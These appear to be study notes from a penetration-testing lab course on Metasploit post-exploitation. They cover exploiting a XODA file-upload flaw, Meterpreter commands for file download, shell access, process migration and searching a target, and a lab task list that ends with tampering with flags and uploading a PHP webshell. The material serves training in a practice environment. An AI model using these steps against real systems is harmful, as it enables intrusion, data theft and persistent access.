

## Post explotation Fundamentals 

![[Pasted image 20230827202208.png]]

Meterpreter 
- The Meterpreter (metapinterpreter)payload is an advanced multi-functional payload that operates via DLL injection and is executed in memory on the target system, consequently making it difficult to detect 
	- Traditional antivirus tools primarily scan files on disk. Detecting malicious activity that only occurs in memory is more challenging. While modern security solutions are improving in this area, it's still a difficult task to reliably detect and mitigate threats that operate solely in memory.
- meterpreter is a staged payload 
- it communicates over a stager socket and provides an attacker with an interactive command interpreter on the target system that facilitates the execution of system commands, file system navigation, keylogging and much more 
- Meterpreter also allows us to load custom script and plugins dynamically 
- MSF provides us with various types of meterpreter payloads that can be used based on the target environment and the OS architecture


1) start `msfconsole` 
2) `setg rhosts ip `
3) `db_nmap -sS -sV -O ip` 
4) we identified a webserver so we will downloads the content of the website: 
	1) `curl` `http://ip `
5) we see the webapplication being zoda which is exploitable 
6) ` search XODA`
7) `use exploit/unix/webapp/xoda_file_upload` 
	1) `set targetui /` (/xoda/ is the default but we want the root of the webserver)

Now we have a meterpreter session. What commands are most interesting? 
- `sysinfo` (what operating system is running on target, kernel version)
- `getuid` (tell us what our permissions are)
- `help` (documentation for meterpreter)
- `ls` 
- `pwd` 
- `cd ..`
- `cat` (display content of files )
- `edit` 
- `cd "Secret files"`
- `download {filename}`
- `unzip {filename.zip}`
- get MDF hash of binary like /bin/bash: `checksum md5 /bin/bash` 
- command is used to retrieve the values of environment variables on the compromised target system: `getenv PATH` 
- command is used to retrieve the values of environment variables on the compromised target system: `getenv TERM`
- search for files: `search -d /usr/bin -f *backdoor*  `
	- - `-d /usr/bin`: This part of the command specifies the directory where the search will take place. In this case, it's set to `/usr/bin`, which is a common directory on Unix-like systems where executable files (programs) are stored. The `-d` flag is used to specify the directory to search in.
	-  `-f`: This flag indicates that we're searching for files (as opposed to directories).
        -  `*backdoor*`: This is a wildcard pattern. The asterisks (`*`) act as placeholders for any characters before and after "backdoor." This means it will match any filename that contains "backdoor" anywhere in the name
- search for specific file extension: `search -f *.jpg `
- if you want to pop a shell on target system: 
	- `shell` 
		- In windows: command prompt session  
		- In linux: terminal session 
- open a bash session: `/bin/bash -i `
- list process tree (processes currently running on the system): `ps`  
- migrate to another process: `migrate` `processid or name process` e.g. 
  `migrate 432`
- execute command via meterpreter: `execute -f ifconfig` 


Sessions: 
- put session in background: `background` or (control + Z)
- kill session: `exit` 
- list sessions: `sessions` 
- help menu for sessions: `sessions -h` 


-----

- Check the present working directory on remote (exploited) machine.
- List the files present in present working directory of the remote machine.
- Check the present working directory on local (attacker) machine.
- List the files present in present working directory of the local machine.
- Get the flag value present in /app/flag1 file.
- Change the flag value present in /app/flag1, so that no one else can get the right flag.
- Change the present working directory to a suspiciously named directory in /app and read the flag from a hidden file present in that directory.
- Get the flag5.zip to local machine, open it using password 56784. The information given in the extracted file will give clue about the location of the another flag.
- Delete the .zip file from the directory.
- Print checksum of file mentioned in the extracted file (Refer to Q8).
- Check the PATH environment variable on the remote machine.
- There is a file with string “ckdo” in its name in one of the places included in PATH variable. Print the flag hidden in that file.
- Change to tools directory on the local machine.
- Upload a PHP webshell to app directory of the remote machine. 